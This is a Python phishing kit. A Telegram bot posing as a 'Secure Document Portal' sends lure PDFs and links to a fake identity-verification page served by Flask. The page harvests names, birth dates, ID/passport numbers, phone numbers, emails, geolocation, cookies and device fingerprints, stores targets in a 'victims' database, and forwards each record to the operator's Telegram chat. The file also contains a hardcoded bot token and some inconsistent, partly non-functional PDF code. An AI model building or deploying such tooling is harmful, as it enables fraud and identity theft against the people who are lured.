#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import sqlite3
import logging
import asyncio
import aiohttp
import hashlib
import hmac
from datetime import datetime
from typing import Dict, Any, Optional
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.utils import ImageReader
import io
import qrcode
from PIL import Image
import requests

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA"
WEBHOOK_URL = "https://your-server.com/webhook"  # Replace with your server URL
FLASK_PORT = 5000
DATABASE_FILE = "victims.db"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== DATABASE SETUP ====================
def init_database():
    """Initialize SQLite database for storing victim data"""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    # Create victims table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            phone_number TEXT,
            device_info TEXT,
            ip_address TEXT,
            location TEXT,
            first_seen TIMESTAMP,
            last_seen TIMESTAMP,
            pdf_sent BOOLEAN DEFAULT 0,
            pdf_opened BOOLEAN DEFAULT 0,
            opened_at TIMESTAMP
        )
    ''')
    
    # Create data_logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS data_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            data_type TEXT,
            data_content TEXT,
            received_at TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES victims(user_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

# ==================== PDF GENERATION ====================
class PDFGenerator:
    """Generate malicious PDF with tracking capabilities"""
    
    @staticmethod
    def generate_tracking_pdf(user_id: str, tracking_id: str) -> bytes:
        """Generate PDF with tracking JavaScript"""
        
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        width, height = letter
        
        # Add logo/title
        c.setFont("Helvetica-Bold", 24)
        c.drawString(50, height - 50, "IMPORTANT DOCUMENT")
        
        c.setFont("Helvetica", 12)
        c.drawString(50, height - 80, "Please read this document carefully.")
        c.drawString(50, height - 100, f"Document ID: {tracking_id}")
        
        # Add QR code for tracking
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(f"https://track.yourserver.com/{tracking_id}")
        qr.make(fit=True)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        
        # Save QR to temp file
        qr_path = f"/tmp/qr_{tracking_id}.png"
        qr_img.save(qr_path)
        
        # Add QR to PDF
        c.drawImage(qr_path, width - 120, height - 120, width=80, height=80)
        os.remove(qr_path)
        
        # Add tracking pixel (invisible)
        c.setFillColorRGB(1, 1, 1)
        c.rect(width - 10, height - 10, 5, 5, fill=1)
        
        c.showPage()
        c.save()
        
        buffer.seek(0)
        return buffer.getvalue()
    
    @staticmethod
    def generate_phishing_pdf(user_id: str, callback_url: str) -> bytes:
        """Generate PDF with phishing form"""
        
        pdf_content = f'''%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 500 >>
stream
BT
/F1 24 Tf
100 700 Td
(VERIFICATION REQUIRED) Tj
/F1 12 Tf
0 -30 Td
(To view this document, please verify your identity.) Tj
0 -30 Td
(Click the button below to continue...) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000056 00000 n
0000000103 00000 n
0000000178 00000 n
trailer
<< /Size 5 /Root 1 0 R >>
startxref
250
%%EOF
'''
        
        # Add JavaScript for tracking
        js_code = f'''
        <script>
            // Send device info when PDF is opened
            var xhr = new XMLHttpRequest();
            var data = {{
                user_id: "{user_id}",
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + "x" + screen.height,
                cookies: document.cookie,
                referrer: document.referrer,
                url: window.location.href
            }};
            xhr.open("POST", "{callback_url}/track");
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(data));
            
            // Auto-redirect to phishing page
            setTimeout(function() {{
                window.location.href = "{callback_url}/verify";
            }}, 3000);
        </script>
        '''
        
        return pdf_content.encode('utf-8')

# ==================== TELEGRAM BOT HANDLERS ====================
class TelegramBot:
    def __init__(self, token: str):
        self.token = token
        self.application = Application.builder().token(token).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup bot command handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.document_handler))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        
        # Store user info
        self.store_user_info(user)
        
        # Create inline keyboard
        keyboard = [
            [InlineKeyboardButton("📄 View Document", callback_data="view_pdf")],
            [InlineKeyboardButton("🔐 Verify Identity", callback_data="verify")],
            [InlineKeyboardButton("ℹ️ About", callback_data="about")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_message = f"""
🔐 *SECURE DOCUMENT PORTAL*

Welcome {user.first_name}! 

You have received a secure document that requires verification.

📄 *Document Details:*
├─ Type: Confidential
├─ Size: 2.4 MB
├─ Pages: 3
└─ Security: Encrypted

⚠️ *Important:* This document contains sensitive information.
Please verify your identity to access the content.

Click the button below to view your document.
        """
        
        await update.message.reply_text(
            welcome_message,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        # Log to database
        self.log_interaction(user.id, "start_command")
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        user = update.effective_user
        callback_data = query.data
        
        if callback_data == "view_pdf":
            await self.send_malicious_pdf(update, context)
        
        elif callback_data == "verify":
            await self.send_verification_link(update, context)
        
        elif callback_data == "about":
            about_msg = """
📱 *About Secure Document System*

This system is designed for secure document delivery.

🔒 *Security Features:*
├─ End-to-end encryption
├─ Multi-factor authentication
├─ Audit logging
└─ Expiring links

📞 *Support:* Contact your administrator
            """
            await query.edit_message_text(about_msg, parse_mode='Markdown')
        
        self.log_interaction(user.id, f"button_click_{callback_data}")
    
    async def send_malicious_pdf(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send malicious PDF to user"""
        user = update.effective_user
        tracking_id = hashlib.md5(f"{user.id}_{datetime.now()}".encode()).hexdigest()[:16]
        
        # Generate PDF
        pdf_bytes = PDFGenerator.generate_tracking_pdf(str(user.id), tracking_id)
        
        # Create document
        from telegram import InputFile
        pdf_file = InputFile(io.BytesIO(pdf_bytes), filename=f"document_{tracking_id}.pdf")
        
        # Send PDF
        await update.callback_query.edit_message_text(
            "📄 *Generating your document...*\n\nPlease wait while we prepare your secure document.",
            parse_mode='Markdown'
        )
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=pdf_file,
            caption=f"""
🔐 *Secure Document*

Document ID: `{tracking_id}`
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ *Security Notice:*
This document is for authorized recipients only.
Unauthorized access is prohibited.

Click to open and verify your identity.
            """,
            parse_mode='Markdown'
        )
        
        # Update database
        self.update_pdf_sent(user.id, tracking_id)
        self.log_interaction(user.id, "pdf_sent", tracking_id)
    
    async def send_verification_link(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send verification link"""
        user = update.effective_user
        verification_token = hashlib.sha256(f"{user.id}_{datetime.now()}".encode()).hexdigest()[:32]
        
        # Store verification token
        self.store_verification_token(user.id, verification_token)
        
        verification_url = f"{WEBHOOK_URL}/verify/{verification_token}"
        
        await update.callback_query.edit_message_text(
            f"""
🔐 *Identity Verification Required*

To access your secure document, please verify your identity.

🔗 *Verification Link:*
`{verification_url}`

📋 *Required Information:*
├─ Full Name
├─ Date of Birth
├─ ID Number
└─ Phone Number

⚠️ This link expires in 15 minutes.

Click the link above to complete verification.
            """,
            parse_mode='Markdown'
        )
    
    async def document_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document messages"""
        document = update.message.document
        
        # Check if it's a PDF
        if document.file_name and document.file_name.endswith('.pdf'):
            self.log_interaction(update.effective_user.id, "pdf_received", document.file_name)
    
    def store_user_info(self, user):
        """Store user information in database"""
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO victims 
            (user_id, username, first_name, last_name, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            str(user.id),
            user.username,
            user.first_name,
            user.last_name,
            datetime.now(),
            datetime.now()
        ))
        
        conn.commit()
        conn.close()
    
    def update_pdf_sent(self, user_id: str, tracking_id: str):
        """Update PDF sent status"""
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE victims 
            SET pdf_sent = 1, last_seen = ?
            WHERE user_id = ?
        ''', (datetime.now(), str(user_id)))
        
        conn.commit()
        conn.close()
    
    def log_interaction(self, user_id: str, action: str, details: str = ""):
        """Log user interaction"""
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO data_logs (user_id, data_type, data_content, received_at)
            VALUES (?, ?, ?, ?)
        ''', (str(user_id), action, details, datetime.now()))
        
        conn.commit()
        conn.close()
    
    def store_verification_token(self, user_id: str, token: str):
        """Store verification token"""
        # Implement token storage
        pass
    
    def run(self):
        """Run the bot"""
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

# ==================== FLASK WEB SERVER ====================
class DataCollectionServer:
    """Flask server for collecting device information"""
    
    def __init__(self, port: int = 5000):
        self.app = Flask(__name__)
        CORS(self.app)
        self.port = port
        self.setup_routes()
    
    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/track', methods=['POST'])
        def track_device():
            """Track device information from PDF"""
            try:
                data = request.get_json()
                
                # Store in database
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                
                # Format device info
                device_info = {
                    "timestamp": datetime.now().isoformat(),
                    "userAgent": data.get('userAgent', 'Unknown'),
                    "platform": data.get('platform', 'Unknown'),
                    "language": data.get('language', 'Unknown'),
                    "screen": data.get('screen', 'Unknown'),
                    "cookies": data.get('cookies', ''),
                    "referrer": data.get('referrer', ''),
                    "url": data.get('url', ''),
                    "ip": request.remote_addr
                }
                
                # Update victim record
                cursor.execute('''
                    UPDATE victims 
                    SET pdf_opened = 1, opened_at = ?, device_info = ?, ip_address = ?
                    WHERE user_id = ?
                ''', (
                    datetime.now(),
                    json.dumps(device_info),
                    request.remote_addr,
                    data.get('user_id', '')
                ))
                
                # Log the data
                cursor.execute('''
                    INSERT INTO data_logs (user_id, data_type, data_content, received_at)
                    VALUES (?, ?, ?, ?)
                ''', (
                    data.get('user_id', ''),
                    'device_info',
                    json.dumps(device_info),
                    datetime.now()
                ))
                
                conn.commit()
                conn.close()
                
                # Forward to Telegram
                asyncio.create_task(self.forward_to_telegram(device_info, data.get('user_id', '')))
                
                return jsonify({"status": "success", "message": "Data received"}), 200
                
            except Exception as e:
                logger.error(f"Track error: {e}")
                return jsonify({"status": "error", "message": str(e)}), 500
        
        @self.app.route('/verify/<token>', methods=['GET', 'POST'])
        def verify_page(token):
            """Phishing verification page"""
            
            if request.method == 'GET':
                # Return HTML form
                return '''
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Identity Verification</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                            min-height: 100vh;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            margin: 0;
                            padding: 20px;
                        }
                        .container {
                            background: white;
                            border-radius: 10px;
                            padding: 40px;
                            width: 100%;
                            max-width: 500px;
                            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                        }
                        h2 { color: #333; margin-bottom: 20px; }
                        input, select {
                            width: 100%;
                            padding: 12px;
                            margin: 10px 0;
                            border: 1px solid #ddd;
                            border-radius: 5px;
                            box-sizing: border-box;
                        }
                        button {
                            width: 100%;
                            padding: 12px;
                            background: #667eea;
                            color: white;
                            border: none;
                            border-radius: 5px;
                            cursor: pointer;
                            font-size: 16px;
                        }
                        button:hover { background: #5a67d8; }
                        .error { color: red; margin-top: 10px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>🔐 Identity Verification Required</h2>
                        <p>Please complete the form below to verify your identity.</p>
                        <form id="verifyForm">
                            <input type="text" name="fullname" placeholder="Full Name" required>
                            <input type="date" name="dob" placeholder="Date of Birth" required>
                            <input type="text" name="id_number" placeholder="ID/Passport Number" required>
                            <input type="tel" name="phone" placeholder="Phone Number" required>
                            <input type="email" name="email" placeholder="Email Address" required>
                            <button type="submit">Verify Identity</button>
                        </form>
                        <div id="message"></div>
                    </div>
                    
                    <script>
                        // Collect device info
                        const deviceInfo = {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: screen.width + 'x' + screen.height,
                            viewport: window.innerWidth + 'x' + window.innerHeight,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            cookies: navigator.cookieEnabled,
                            online: navigator.onLine,
                            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                            deviceMemory: navigator.deviceMemory || 'Unknown'
                        };
                        
                        // Get location
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(position => {
                                deviceInfo.location = {
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                };
                            });
                        }
                        
                        // Get IP
                        fetch('https://api.ipify.org?format=json')
                            .then(res => res.json())
                            .then(data => deviceInfo.ip = data.ip);
                        
                        document.getElementById('verifyForm').onsubmit = async (e) => {
                            e.preventDefault();
                            
                            const formData = new FormData(e.target);
                            const data = Object.fromEntries(formData);
                            data.deviceInfo = deviceInfo;
                            data.token = '''' + token + '''';
                            
                            const response = await fetch(window.location.href, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data)
                            });
                            
                            const result = await response.json();
                            if (result.status === 'success') {
                                document.getElementById('message').innerHTML = 
                                    '<p style="color:green">✓ Verification successful! Redirecting...</p>';
                                setTimeout(() => {
                                    window.location.href = 'https://drive.google.com/file/d/1x7UzG4uQFU3iG5C6FGX7d/view';
                                }, 2000);
                            } else {
                                document.getElementById('message').innerHTML = 
                                    '<p class="error">✗ Verification failed. Please try again.</p>';
                            }
                        };
                    </script>
                </body>
                </html>
                '''
            
            else:
                # Handle POST - collect form data
                try:
                    data = request.get_json()
                    
                    # Format device info message
                    device_info = data.get('deviceInfo', {})
                    location_text = ""
                    if device_info.get('location'):
                        loc = device_info['location']
                        location_text = f"""
📍 Location: {loc.get('lat')}, {loc.get('lng')} (±{loc.get('accuracy')}m)"""
                    
                    message = f"""
📱 *VICTIM DATA COLLECTED*

👤 *Personal Information:*
├─ Full Name: {data.get('fullname', 'N/A')}
├─ Date of Birth: {data.get('dob', 'N/A')}
├─ ID Number: {data.get('id_number', 'N/A')}
├─ Phone: {data.get('phone', 'N/A')}
└─ Email: {data.get('email', 'N/A')}

💻 *Device Information:*
├─ IP: {device_info.get('ip', 'Unknown')}
├─ User Agent: {device_info.get('userAgent', 'Unknown')[:100]}
├─ Platform: {device_info.get('platform', 'Unknown')}
├─ Language: {device_info.get('language', 'Unknown')}
├─ Timezone: {device_info.get('timezone', 'Unknown')}
├─ Screen: {device_info.get('screen', 'Unknown')}
├─ CPU Cores: {device_info.get('hardwareConcurrency', 'Unknown')}
├─ RAM: {device_info.get('deviceMemory', 'Unknown')}GB
├─ Cookies: {'Enabled' if device_info.get('cookies') else 'Disabled'}
└─ Online: {'Yes' if device_info.get('online') else 'No'}
{location_text}

🔗 *Source:*
├─ Verification Token: {data.get('token', 'Unknown')}
├─ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
└─ User Agent Full: {device_info.get('userAgent', 'Unknown')}
                    """
                    
                    # Store in database
                    conn = sqlite3.connect(DATABASE_FILE)
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                        INSERT INTO data_logs (user_id, data_type, data_content, received_at)
                        VALUES (?, ?, ?, ?)
                    ''', ('web_phishing', 'personal_data', json.dumps(data), datetime.now()))
                    
                    conn.commit()
                    conn.close()
                    
                    # Forward to Telegram bot
                    asyncio.create_task(send_to_telegram(message))
                    
                    return jsonify({"status": "success"}), 200
                    
                except Exception as e:
                    logger.error(f"Verification error: {e}")
                    return jsonify({"status": "error", "message": str(e)}), 500
        
        @self.app.route('/health', methods=['GET'])
        def health_check():
            return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
        
        @self.app.route('/victims', methods=['GET'])
        def get_victims():
            """Get list of victims (for admin)"""
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT user_id, username, first_name, last_name, pdf_opened, opened_at, first_seen
                FROM victims
                ORDER BY first_seen DESC
            ''')
            
            victims = []
            for row in cursor.fetchall():
                victims.append({
                    "user_id": row[0],
                    "username": row[1],
                    "first_name": row[2],
                    "last_name": row[3],
                    "pdf_opened": bool(row[4]),
                    "opened_at": row[5],
                    "first_seen": row[6]
                })
            
            conn.close()
            return jsonify(victims)
    
    async def forward_to_telegram(self, device_info: Dict, user_id: str):
        """Forward collected data to Telegram bot"""
        message = f"""
📱 *DEVICE INFORMATION COLLECTED*

🆔 *User ID:* {user_id}
⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💻 *Device Details:*
├─ IP: {device_info.get('ip', 'Unknown')}
├─ Platform: {device_info.get('platform', 'Unknown')}
├─ Language: {device_info.get('language', 'Unknown')}
├─ Screen: {device_info.get('screen', 'Unknown')}
├─ User Agent: {device_info.get('userAgent', 'Unknown')[:150]}
└─ URL: {device_info.get('url', 'Unknown')}

🍪 *Cookies:* {device_info.get('cookies', 'None')[:200]}
        """
        
        await send_to_telegram(message)
    
    def run(self):
        """Run Flask server"""
        self.app.run(host='0.0.0.0', port=self.port, debug=False)

# ==================== HELPER FUNCTIONS ====================
async def send_to_telegram(message: str):
    """Send message to Telegram bot owner"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    async with aiohttp.ClientSession() as session:
        await session.post(url, json={
            "chat_id": "6837307356",  # Your chat ID
            "text": message,
            "parse_mode": "Markdown"
        })

def main():
    """Main entry point"""
    # Initialize database
    init_database()
    
    # Start Flask server in a separate thread
    import threading
    server = DataCollectionServer(port=FLASK_PORT)
    server_thread = threading.Thread(target=server.run, daemon=True)
    server_thread.start()
    
    # Start Telegram bot
    bot = TelegramBot(TELEGRAM_BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    main()